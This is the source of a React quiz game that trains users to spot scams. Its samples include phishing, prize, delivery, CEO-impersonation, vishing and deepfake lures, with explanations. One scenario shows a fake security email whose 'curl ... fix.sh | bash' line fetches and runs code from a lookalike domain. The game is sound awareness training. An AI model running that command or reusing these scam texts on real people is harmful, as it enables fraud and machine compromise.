import { useState, useEffect, useCallback } from "react";
import NeonButton from "../components/ui/NeonButton.jsx";

// ─── Scenario data (ported from game.js) ─────────────────────────────────────
const SCENARIOS = [
  // TIER 1
  {
    tier: 1, type: "phishing", typeLabel: "📧 PHISHING", title: "Suspicious Email",
    content: `From: support@paypa1-secure.com\nSubject: Your PayPal account has been limited!\n\nDear Customer,\n\nWe noticed unusual activity on your account. Your PayPal access has been limited until you verify your information.\n\nClick here to restore access: http://paypa1-secure.com/verify\n\nIf you don't verify within 24 hours, your account will be permanently closed.\n\nPayPal Security Team`,
    options: [
      { text: '🚨 SCAM — "paypa1-secure.com" uses the number "1" instead of "l"', correct: true },
      { text: "✅ LEGITIMATE — PayPal often sends security alerts", correct: false },
      { text: "🤔 SAFE — It mentions a reference number so it must be real", correct: false },
      { text: "✅ LEGITIMATE — I should verify my account immediately", correct: false },
    ],
    explanation: 'Classic phishing email. The domain "paypa1-secure.com" uses the number "1" instead of the letter "l" (homograph attack). Real PayPal emails come from @paypal.com. Urgency tactics ("24 hours") make you act without thinking.',
    tip: "💡 Always check the sender's email domain carefully. Hover over links to see the real URL before clicking.",
  },
  {
    tier: 1, type: "prize", typeLabel: "🎁 PRIZE SCAM", title: "Lottery Winner Notification",
    content: `📱 Text Message:\n\nCongratulations!!! Your phone number has been selected in the Microsoft Lottery draw. You've won $2,500,000!\n\nTo claim, send your:\n- Full name\n- Address\n- Bank account number\n- Copy of ID\n\nReply CLAIM or email: microsoft.lottery@gmail.com\n\nRef: MS-WIN-2026-8834`,
    options: [
      { text: "✅ REAL — Microsoft is a big company with lottery programs", correct: false },
      { text: "🚨 SCAM — Legitimate lotteries never ask for bank details via text", correct: true },
      { text: "🤔 I should reply to get more information first", correct: false },
      { text: "✅ The reference number proves it's legitimate", correct: false },
    ],
    explanation: "Lottery/prize scam. You can't win a lottery you never entered. Microsoft doesn't run lotteries. Using a @gmail.com address (not @microsoft.com). Asking for sensitive personal information upfront.",
    tip: "💡 You cannot win a lottery or contest you never entered. Legitimate organizations never ask for bank details via text.",
  },
  {
    tier: 1, type: "delivery", typeLabel: "📦 DELIVERY SCAM", title: "Package Delivery Notice",
    content: `📱 SMS from "FedEx":\n\nFedEx: Your package #FX-9928341 could not be delivered. Incorrect address on file.\n\nUpdate your delivery address and pay a redelivery fee of $1.99:\nhttps://fedex-redelivery-update.com/pay\n\nPackage will be returned to sender in 48 hours.`,
    options: [
      { text: "✅ I should pay $1.99 to get my package", correct: false },
      { text: "🤔 I'll click to check if I have pending deliveries", correct: false },
      { text: "🚨 SCAM — FedEx doesn't charge redelivery fees via random links", correct: true },
      { text: "✅ The tracking number looks real so this is legitimate", correct: false },
    ],
    explanation: 'Delivery scams are very common. FedEx and other couriers never send SMS asking for payment through external links. "fedex-redelivery-update.com" is NOT an official FedEx domain. The $1.99 fee is designed to steal your card info.',
    tip: "💡 Always track packages through the official courier website or app, never through links in texts.",
  },
  // TIER 2
  {
    tier: 2, type: "impersonation", typeLabel: "🎭 IMPERSONATION", title: "CEO Urgent Request",
    content: `WhatsApp from "David Chen - CEO":\n\n"Hey, are you at your desk? I'm in a confidential meeting and can't make calls.\n\nI need a favor — can you purchase 4x $200 Apple gift cards for a client appreciation event?\nI'll reimburse you by end of day. Get the cards and send me photos of the codes.\n\nPlease don't mention this to others — it's a surprise. Thanks!"`,
    options: [
      { text: "✅ I should help the CEO — it sounds urgent", correct: false },
      { text: "🚨 SCAM — Real CEOs don't ask employees to buy gift cards via WhatsApp", correct: true },
      { text: "🤔 I should buy the cards but wait to send the codes", correct: false },
      { text: "✅ The CEO said it's confidential so I should keep it secret", correct: false },
    ],
    explanation: "CEO/boss impersonation scam. Key red flags: using personal messaging (WhatsApp) for business, requesting gift cards (untraceable), asking for secrecy, and creating urgency. Always verify through official company channels.",
    tip: "💡 Gift card requests from authority figures are almost always scams. Verify through a separate, known communication channel.",
  },
  {
    tier: 2, type: "phishing", typeLabel: "📧 PHISHING", title: "Account Security Alert",
    content: `Email from: no-reply@accounts.g00gle-security.com\nSubject: Unusual sign-in activity on your Google Account\n\n⚠️ Someone just used your password to sign in.\n\nLocation: Moscow, Russia — 3:42 AM\n\nIf this wasn't you, secure your account:\n[Secure My Account] → https://accounts.g00gle-security.com/signin/recovery\n\nGoogle Security Team`,
    options: [
      { text: "✅ I should secure my account immediately via the link", correct: false },
      { text: "🤔 The details look specific so this must be real", correct: false },
      { text: '🚨 SCAM — "g00gle-security.com" is not Google\'s real domain', correct: true },
      { text: "✅ Google often sends these alerts, this looks normal", correct: false },
    ],
    explanation: 'Sophisticated phishing email. "g00gle-security.com" uses zeros instead of "o"s. Real Google alerts come from @google.com. The specific location (Moscow, Russia) is designed to create fear and urgency.',
    tip: "💡 Go directly to your account settings by typing the URL manually. Never use links from emails for security actions.",
  },
  {
    tier: 2, type: "emotional", typeLabel: "💔 EMOTIONAL MANIPULATION", title: "Charity Emergency",
    content: `Facebook Message from "Save The Children Foundation":\n\n🆘 EMERGENCY APPEAL 🆘\n\nDevastating earthquake — thousands of children trapped!\n\n💰 Donate NOW via direct transfer:\nAccount: 8847291034 — Bank: Western Union\n\nOr send BTC to: 1A2b3C4d5E6f7G8h9I0j\n\nDon't wait — children are dying RIGHT NOW! Share this message!\n#SaveTheChildren #EmergencyAid`,
    options: [
      { text: "✅ I should donate immediately to help the children", correct: false },
      { text: "🚨 SCAM — Legitimate charities don't use Facebook DMs and crypto for donations", correct: true },
      { text: "🤔 I should share this message to spread awareness", correct: false },
      { text: "✅ Save The Children is a real charity so this must be legitimate", correct: false },
    ],
    explanation: "Exploits emotional manipulation using a real charity's name. Red flags: Direct bank transfers and cryptocurrency (untraceable), extreme urgency, Facebook messages instead of official channels.",
    tip: "💡 Always donate through official charity websites. Verify emergency appeals through trusted news sources before donating.",
  },
  // TIER 3
  {
    tier: 3, type: "homograph", typeLabel: "🔤 HOMOGRAPH ATTACK", title: "Banking Notification",
    content: `Email from: security@chasе.com\nSubject: Important: Verify your Chase account\n\nDear Valued Customer,\n\nAs part of our enhanced security measures, please verify your account:\nhttps://www.chasе.com/verify-account\n\nThis is mandatory and must be completed within 7 days.\n\nChase Security Department\n\n(Note: The "е" above is actually a Cyrillic character, not the Latin "e")`,
    options: [
      { text: "✅ This looks legitimate — Chase is my bank", correct: false },
      { text: "🤔 The 7-day deadline seems reasonable, not too urgent", correct: false },
      { text: '🚨 SCAM — Domain uses a Cyrillic "е" instead of Latin "e" (homograph attack)', correct: true },
      { text: "✅ The email looks professional so I should verify", correct: false },
    ],
    explanation: 'Homograph attack — one of the most sophisticated phishing techniques. The "е" in "chasе.com" is a Cyrillic character that looks identical to the Latin "e" but leads to a completely different domain.',
    tip: "💡 Type bank URLs manually. Enable IDN warnings in your browser to detect homograph attacks.",
  },
  {
    tier: 3, type: "socialeng", typeLabel: "🧠 SOCIAL ENGINEERING", title: "IT Department Call",
    content: `📞 Phone Call:\n\n"Hi, this is Jake from the IT Help Desk. We're upgrading the company VPN.\n\nI already have your employee ID from HR. I just need your current password to set up your new VPN profile. Otherwise you won't be able to work remotely starting tomorrow.\n\nAuthorized by your department head. Ticket: INC-20260216-0042.\n\nCould you please confirm your password?"`,
    options: [
      { text: "✅ He has my employee ID and a ticket number — this seems legitimate", correct: false },
      { text: "🚨 SCAM — IT support NEVER asks for your password over the phone", correct: true },
      { text: "🤔 I should give my password since he has authorization", correct: false },
      { text: "✅ The VPN migration sounds like a real IT project", correct: false },
    ],
    explanation: "Social engineering (vishing) attack. No legitimate IT department will ever ask for your password — they can reset it without knowing it. Ticket numbers and employee IDs are designed to build false trust.",
    tip: "💡 Your IT department never needs your password. If someone asks, hang up and call your IT help desk directly using the number from your company directory.",
  },
  {
    tier: 3, type: "investment", typeLabel: "💰 INVESTMENT SCAM", title: "Crypto Investment Opportunity",
    content: `LinkedIn Message from "Sarah Wang - Goldman Sachs VP":\n\n"Hi! I think you'd be perfect for an exclusive investment opportunity.\n\nOur AI trading platform guarantees 30% monthly returns on cryptocurrency.\n\n✅ Minimum investment: $500\n✅ Guaranteed returns: 30%/month\n✅ No risk — your principal is fully insured\n✅ Withdraw anytime\n\nLimited spots available. DM me!"`,
    options: [
      { text: "✅ Goldman Sachs is reputable, this must be legitimate", correct: false },
      { text: "🤔 I should research the platform before investing", correct: false },
      { text: "✅ 30% returns with no risk sounds like a great deal", correct: false },
      { text: '🚨 SCAM — "Guaranteed" high returns with no risk is impossible', correct: true },
    ],
    explanation: "Investment/crypto scam (likely a Ponzi scheme). No legitimate investment guarantees 30% monthly returns with zero risk — that's mathematically unsustainable.",
    tip: "💡 If an investment promises guaranteed high returns with no risk, it's almost certainly a scam.",
  },
  // TIER 4
  {
    tier: 4, type: "deepfake", typeLabel: "🤖 DEEPFAKE", title: "Video Call from Manager",
    content: `📹 Scenario:\n\nYou receive a video call from someone who looks and sounds exactly like your department manager:\n\n"I need you to process an urgent wire transfer of $45,000 to this vendor account. The contract was just signed and they need payment today. The CEO approved it personally. I'll send the formal paperwork tomorrow."\n\nThe video quality is slightly lower than usual, and they seem to blink less frequently than normal.`,
    options: [
      { text: "✅ It's a video call with my manager — I can see it's them", correct: false },
      { text: "🤔 I'll process it since the CEO approved", correct: false },
      { text: "🚨 Could be DEEPFAKE — I should verify through another channel first", correct: true },
      { text: "✅ Urgent payment makes sense if a contract was just signed", correct: false },
    ],
    explanation: "Deepfake video calls are an emerging threat. AI can now clone someone's face and voice in real-time. Red flags: urgent wire transfers, verbal-only authorization, unusual blink patterns.",
    tip: "💡 With deepfake technology, seeing someone on video is no longer proof of identity. Verify large financial requests through a secondary channel.",
  },
  {
    tier: 4, type: "supply", typeLabel: "🔗 SUPPLY CHAIN ATTACK", title: "Developer Security Alert",
    content: `Email from: updates@vscode-marketplace.dev\nSubject: Critical Security Update for VS Code Extension\n\nA critical vulnerability (CVE-2026-1847) was discovered in "Prettier". This vulnerability allows remote code execution.\n\nPlease update immediately:\nhttps://vscode-marketplace.dev/prettier/patch\n\nOr run:\ncurl -sL https://vscode-marketplace.dev/fix.sh | bash\n\nVS Code Security Team`,
    options: [
      { text: "✅ CVE numbers look legitimate — I should update immediately", correct: false },
      { text: "🤔 I'll run the terminal command to be safe", correct: false },
      { text: '🚨 SCAM — "vscode-marketplace.dev" is not Microsoft\'s domain, and curl|bash is dangerous', correct: true },
      { text: "✅ I should download the patched version from the link", correct: false },
    ],
    explanation: 'Supply chain attack targeting developers. "vscode-marketplace.dev" is NOT the real VS Code Marketplace (marketplace.visualstudio.com). The "curl | bash" command would execute arbitrary code on your machine.',
    tip: '💡 Never run "curl | bash" from untrusted sources. Always update software through official channels, not email links.',
  },
  // TIER 5
  {
    tier: 5, type: "ai_phishing", typeLabel: "🧬 AI-POWERED PHISHING", title: "AI-Generated Spear Phishing",
    content: `Email from: jennifer.wilson@partner-firm.com\nSubject: Re: Q4 Revenue Figures - Follow-up\n\nHi [Your Name],\n\nGreat catching up at the industry conference last week! As discussed during our coffee chat, I'm sending the revised Q4 analysis.\n\nI incorporated your suggestions about APAC market segmentation.\n\nHere's the updated report: [Revenue_Analysis_Q4_2026_FINAL.xlsx.exe]\n\nLet me know your thoughts before the board meeting Thursday.\n\nBest, Jennifer Wilson\n(Note: This was crafted using AI to reference your real social media posts)`,
    options: [
      { text: "✅ She mentions specific conference details — must be real", correct: false },
      { text: "🤔 I'll open the attachment to check the report", correct: false },
      { text: '🚨 SCAM — ".xlsx.exe" is an executable disguised as a spreadsheet (AI spear phishing)', correct: true },
      { text: "✅ It's a reply thread so I must have emailed her first", correct: false },
    ],
    explanation: "AI-powered spear phishing. AI can scrape your social media to craft extremely personalized messages. The file extension '.xlsx.exe' is an executable masquerading as a spreadsheet — opening it would install malware.",
    tip: "💡 Even highly personalized emails can be scams. Always check file extensions carefully. '.xlsx.exe' is always malicious.",
  },
];

const RANKS = [
  { min: 0,    max: 499,  badge: "🥉", name: "Trainee",       next: 500 },
  { min: 500,  max: 999,  badge: "🥈", name: "Detective",     next: 1000 },
  { min: 1000, max: 1999, badge: "🥇", name: "Senior Analyst",next: 2000 },
  { min: 2000, max: 2999, badge: "🏆", name: "Cyber Expert",  next: 3000 },
  { min: 3000, max: Infinity, badge: "💎", name: "Elite Defender", next: Infinity },
];

function getRank(score) {
  return RANKS.find((r) => score >= r.min && score <= r.max) || RANKS[0];
}

function getFilteredScenarios(tier) {
  return SCENARIOS.filter((s) => s.tier <= tier);
}

const DETECTION_TIPS = [
  "🔗 Always check the sender's actual email address",
  "⏰ Urgency & pressure = red flag",
  "🎁 Free offers are rarely free",
  "🔒 Legitimate companies never ask for passwords via email",
  "📎 Be cautious with unexpected attachments",
];

export default function GameMode() {
  const [tier, setTier] = useState(1);
  const [queue, setQueue] = useState(() => shuffle(getFilteredScenarios(1)));
  const [qIndex, setQIndex] = useState(0);
  const [selected, setSelected] = useState(null);
  const [score, setScore] = useState(0);
  const [streak, setStreak] = useState(0);
  const [best, setBest] = useState(() => Number(localStorage.getItem("nt-game-best") || 0));
  const [correct, setCorrect] = useState(0);
  const [total, setTotal] = useState(0);
  const [phase, setPhase] = useState("playing"); // playing | feedback | gameover
  const [gamesPlayed, setGamesPlayed] = useState(() => Number(localStorage.getItem("nt-games-played") || 0));
  const [leaderboard, setLeaderboard] = useState(() => {
    try { return JSON.parse(localStorage.getItem("nt-leaderboard") || "[]"); } catch { return []; }
  });
  const [playerName, setPlayerName] = useState("");

  const scenario = queue[qIndex];
  const rank = getRank(score);

  function shuffle(arr) {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  const handleTierChange = useCallback((t) => {
    setTier(t);
    setQueue(shuffle(getFilteredScenarios(t)));
    setQIndex(0);
    setSelected(null);
    setPhase("playing");
  }, []);

  const handleAnswer = (opt) => {
    if (selected !== null) return;
    setSelected(opt);
    const isCorrect = opt.correct;
    setTotal((p) => p + 1);
    if (isCorrect) {
      const pts = tier * 100 + streak * 50;
      const newScore = score + pts;
      setScore(newScore);
      setStreak((p) => p + 1);
      setCorrect((p) => p + 1);
      if (newScore > best) {
        setBest(newScore);
        localStorage.setItem("nt-game-best", String(newScore));
      }
    } else {
      setStreak(0);
    }
    setPhase("feedback");
  };

  const handleNext = () => {
    const nextIndex = qIndex + 1;
    if (nextIndex >= queue.length) {
      setPhase("gameover");
      const played = gamesPlayed + 1;
      setGamesPlayed(played);
      localStorage.setItem("nt-games-played", String(played));
    } else {
      setQIndex(nextIndex);
      setSelected(null);
      setPhase("playing");
    }
  };

  const handleRestart = () => {
    setScore(0);
    setStreak(0);
    setCorrect(0);
    setTotal(0);
    setQueue(shuffle(getFilteredScenarios(tier)));
    setQIndex(0);
    setSelected(null);
    setPhase("playing");
  };

  const handleSubmitScore = () => {
    if (!playerName.trim()) return;
    const entry = { name: playerName.trim(), score, badge: rank.badge, rank: rank.name };
    const updated = [...leaderboard, entry].sort((a, b) => b.score - a.score).slice(0, 10);
    setLeaderboard(updated);
    localStorage.setItem("nt-leaderboard", JSON.stringify(updated));
    setPlayerName("");
  };

  const tierColors = ["", "var(--green)", "var(--accent)", "var(--orange)", "var(--red)", "#9b59b6"];
  const TIER_LABELS = ["", "Easy", "Medium", "Hard", "Expert", "Ultimate"];

  const accuracy = total > 0 ? Math.round((correct / total) * 100) : null;

  return (
    <div style={{ maxWidth: 1100, margin: "0 auto", padding: "40px 24px" }}>
      {/* Hero */}
      <div style={{ textAlign: "center", marginBottom: 32 }}>
        <div style={{ display: "inline-flex", alignItems: "center", gap: 8, padding: "6px 14px", background: "rgba(0,212,255,0.1)", border: "1px solid var(--accent)", borderRadius: 20, fontSize: 12, fontWeight: 600, color: "var(--accent)", marginBottom: 14, textTransform: "uppercase", letterSpacing: "0.5px" }}>
          <span style={{ width: 6, height: 6, borderRadius: "50%", background: "var(--green)", display: "inline-block", animation: "pulse 2s infinite" }} />
          Gamified Training
        </div>
        <h1 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: "clamp(22px, 4vw, 34px)", marginBottom: 10 }}>
          Cyber Detective Training
        </h1>
        <p style={{ color: "var(--text-muted)", fontSize: 15 }}>Test your scam detection skills</p>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 280px", gap: 24, alignItems: "start" }}>
        {/* Main Game */}
        <div>
          {/* Header: Score + Tiers */}
          <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "16px 20px", marginBottom: 16 }}>
            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 14, flexWrap: "wrap", gap: 12 }}>
              {[{ l: "Score", v: score, c: "var(--accent)" }, { l: "Streak", v: `${streak}🔥`, c: "var(--orange)" }, { l: "Best", v: best, c: "var(--green)" }, { l: "Q", v: `${qIndex + 1}/${queue.length}`, c: "var(--text-secondary)" }].map(({ l, v, c }) => (
                <div key={l} style={{ textAlign: "center" }}>
                  <div style={{ fontSize: 11, color: "var(--text-muted)", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: 2 }}>{l}</div>
                  <div style={{ fontSize: 22, fontWeight: 700, color: c, fontFamily: "var(--font-display, 'Orbitron', sans-serif)" }}>{v}</div>
                </div>
              ))}
            </div>

            {/* Tier selector */}
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              {[1, 2, 3, 4, 5].map((t) => (
                <button
                  key={t}
                  onClick={() => handleTierChange(t)}
                  style={{
                    padding: "6px 14px", borderRadius: 6, border: `1px solid ${tier === t ? tierColors[t] : "var(--glass-border)"}`,
                    background: tier === t ? `${tierColors[t]}22` : "transparent", color: tier === t ? tierColors[t] : "var(--text-muted)",
                    fontSize: 12, fontWeight: 700, cursor: "pointer", textTransform: "uppercase", letterSpacing: "0.5px"
                  }}
                >
                  {TIER_LABELS[t]}
                </button>
              ))}
            </div>
          </div>

          {/* Rank bar */}
          <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "14px 20px", marginBottom: 16, display: "flex", alignItems: "center", gap: 14 }}>
            <span style={{ fontSize: 32 }}>{rank.badge}</span>
            <div>
              <div style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 14, fontWeight: 700 }}>{rank.name}</div>
              <div style={{ fontSize: 12, color: "var(--text-muted)" }}>
                {rank.next === Infinity ? "Max rank achieved!" : `Score ${rank.next}+ for next rank`}
              </div>
            </div>
            <div style={{ marginLeft: "auto", width: 160 }}>
              <div style={{ height: 6, background: "rgba(255,255,255,0.1)", borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", borderRadius: 3, background: "var(--accent)", width: `${rank.next === Infinity ? 100 : Math.min(100, ((score - rank.min) / (rank.next - rank.min)) * 100)}%`, transition: "width 0.5s ease" }} />
              </div>
            </div>
          </div>

          {/* Scenario */}
          {phase !== "gameover" && scenario && (
            <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "24px 28px" }}>
              <div style={{ display: "inline-block", padding: "4px 10px", background: "rgba(0,255,65,0.1)", color: "var(--green)", borderRadius: 6, fontSize: 12, fontWeight: 700, marginBottom: 14, letterSpacing: "0.5px" }}>
                {scenario.typeLabel}
              </div>
              <h3 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 16, marginBottom: 16 }}>{scenario.title}</h3>
              <pre style={{ fontSize: 13, color: "var(--text-secondary)", lineHeight: 1.65, whiteSpace: "pre-wrap", background: "rgba(0,0,0,0.15)", padding: "14px 16px", borderRadius: "var(--radius-md)", marginBottom: 20, fontFamily: "var(--font-mono, monospace)" }}>
                {scenario.content}
              </pre>

              {/* Answer buttons */}
              <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 20 }}>
                {scenario.options.map((opt, i) => {
                  let bg = "transparent", border = "var(--glass-border)", color = "var(--text-primary)";
                  if (selected !== null) {
                    if (opt.correct) { bg = "rgba(0,255,65,0.1)"; border = "var(--green)"; color = "var(--green)"; }
                    else if (opt === selected && !opt.correct) { bg = "rgba(255,58,58,0.1)"; border = "var(--red)"; color = "var(--red)"; }
                  }
                  return (
                    <button
                      key={i}
                      disabled={selected !== null}
                      onClick={() => handleAnswer(opt)}
                      style={{ padding: "12px 16px", borderRadius: "var(--radius-md)", border: `1px solid ${border}`, background: bg, color, textAlign: "left", fontSize: 13, cursor: selected !== null ? "default" : "pointer", lineHeight: 1.5, transition: "all 0.2s" }}
                    >
                      {opt.text}
                    </button>
                  );
                })}
              </div>

              {/* Feedback */}
              {phase === "feedback" && (
                <div style={{ background: selected?.correct ? "rgba(0,255,65,0.07)" : "rgba(255,58,58,0.07)", border: `1px solid ${selected?.correct ? "rgba(0,255,65,0.3)" : "rgba(255,58,58,0.3)"}`, borderRadius: "var(--radius-md)", padding: "16px 18px" }}>
                  <div style={{ fontWeight: 700, color: selected?.correct ? "var(--green)" : "var(--red)", marginBottom: 8 }}>
                    {selected?.correct ? "✓ Correct! Well spotted." : "✗ Incorrect. Here's why:"}
                  </div>
                  <p style={{ color: "var(--text-secondary)", fontSize: 13, lineHeight: 1.65, marginBottom: 10 }}>{scenario.explanation}</p>
                  <p style={{ color: "var(--accent)", fontSize: 13 }}>{scenario.tip}</p>
                  <div style={{ marginTop: 14 }}>
                    <NeonButton size="sm" onClick={handleNext}>NEXT SCENARIO →</NeonButton>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Game Over */}
          {phase === "gameover" && (
            <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "40px 28px", textAlign: "center" }}>
              <h2 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", color: "var(--green)", marginBottom: 16, fontSize: 22 }}>
                🎉 Training Complete!
              </h2>
              <div style={{ fontSize: 56, margin: "0 0 12px" }}>{rank.badge}</div>
              <div style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 36, color: "var(--accent)", marginBottom: 6 }}>{score}</div>
              <div style={{ color: "var(--text-muted)", marginBottom: 8 }}>{rank.name}</div>
              <div style={{ color: "var(--text-secondary)", fontSize: 14, marginBottom: 24 }}>
                Accuracy: {accuracy !== null ? `${accuracy}%` : "—"} ({correct}/{total} correct)
              </div>

              <div style={{ maxWidth: 300, margin: "0 auto", display: "flex", flexDirection: "column", gap: 10 }}>
                <input
                  type="text"
                  value={playerName}
                  onChange={(e) => setPlayerName(e.target.value)}
                  placeholder="Enter your name for leaderboard"
                  maxLength={20}
                  style={{ padding: "10px 14px", background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-md)", color: "var(--text-primary)", fontSize: 13, outline: "none" }}
                />
                <NeonButton variant="glass" onClick={handleSubmitScore} disabled={!playerName.trim()}>Submit Score</NeonButton>
                <NeonButton onClick={handleRestart}>Restart</NeonButton>
              </div>
            </div>
          )}
        </div>

        {/* Sidebar */}
        <div style={{ display: "flex", flexDirection: "column", gap: 18, position: "sticky", top: 80 }}>
          {/* Leaderboard */}
          <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "18px" }}>
            <h3 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 14, marginBottom: 12 }}>🏆 Leaderboard</h3>
            {leaderboard.length === 0 ? (
              <p style={{ color: "var(--text-muted)", fontSize: 13 }}>No scores yet. Be the first!</p>
            ) : (
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                <thead>
                  <tr style={{ color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                    <th style={{ padding: "4px 6px", textAlign: "left" }}>#</th>
                    <th style={{ padding: "4px 6px", textAlign: "left" }}>Player</th>
                    <th style={{ padding: "4px 6px", textAlign: "right" }}>Score</th>
                    <th style={{ padding: "4px 6px", textAlign: "center" }}>Rank</th>
                  </tr>
                </thead>
                <tbody>
                  {leaderboard.slice(0, 8).map((e, i) => (
                    <tr key={i} style={{ borderTop: "1px solid var(--glass-border)" }}>
                      <td style={{ padding: "6px", color: "var(--text-muted)" }}>{i + 1}</td>
                      <td style={{ padding: "6px", color: "var(--text-primary)", maxWidth: 90, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{e.name}</td>
                      <td style={{ padding: "6px", textAlign: "right", color: "var(--accent)", fontWeight: 700 }}>{e.score}</td>
                      <td style={{ padding: "6px", textAlign: "center", fontSize: 16 }}>{e.badge}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>

          {/* Detection Tips */}
          <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "18px" }}>
            <h3 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 14, marginBottom: 12 }}>💡 Detection Tips</h3>
            <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: 8 }}>
              {DETECTION_TIPS.map((tip, i) => (
                <li key={i} style={{ color: "var(--text-secondary)", fontSize: 13, lineHeight: 1.5 }}>{tip}</li>
              ))}
            </ul>
          </div>

          {/* Your Stats */}
          <div style={{ background: "var(--bg-card)", border: "1px solid var(--glass-border)", borderRadius: "var(--radius-lg)", padding: "18px" }}>
            <h3 style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)", fontSize: 14, marginBottom: 12 }}>📊 Your Stats</h3>
            {[
              { label: "Games Played", value: gamesPlayed, color: "var(--accent)" },
              { label: "Best Score", value: best, color: "var(--green)" },
              { label: "Accuracy", value: accuracy !== null ? `${accuracy}%` : "—", color: "var(--orange)" },
            ].map(({ label, value, color }) => (
              <div key={label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "6px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
                <span style={{ fontSize: 13, color: "var(--text-secondary)" }}>{label}</span>
                <span style={{ fontSize: 13, fontWeight: 700, color }}>{value}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
